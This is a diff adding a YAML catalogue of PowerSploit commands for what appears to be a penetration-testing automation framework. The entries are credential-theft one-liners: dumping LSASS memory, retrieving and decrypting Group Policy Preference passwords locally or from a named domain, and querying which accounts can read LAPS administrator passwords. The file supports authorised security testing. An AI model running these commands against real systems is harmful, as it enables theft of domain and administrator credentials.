@@ -1,0 +1,43 @@
+---
+name: PowerSploit
+description: A collection of PowerShell modules for penetration testers
+os: Linux
+ptf_module: modules/powershell/powersploit
+---
+commands:
+  - "Dump LSASS Process Memory":
+    - type: ["powershell","autonomous"]
+    - text: "Get-Process lsass | Out-Minidump"
+    - input: null
+    - output: ["STDOUT",{"FILE":{"string":"lsass_*.dmp"}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Search Domain Controller for Group Policy Preferences":
+    - type: ["powershell","standalone"]
+    - text: "Get-GPPPassword"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Decrypt 'cpassword' Value Found in XLM Files":
+    - type: ["powershell","standalone"]
+    - text: "Get-GPPPassword '{STR}'"
+    - input: ["cpassword value"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Remotely Search, Retrieve, and Decrypt Group Policy XLM Files":
+    - type: ["powershell","standalone"]
+    - text: "Get-GPPPassword -Server {DOMAIN}"
+    - input: ["target domain"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Read Plaintext LAPS Passwords from Domain Controller":
+    - type: ["powershell","autonomous"]
+    - text: "Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')}"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
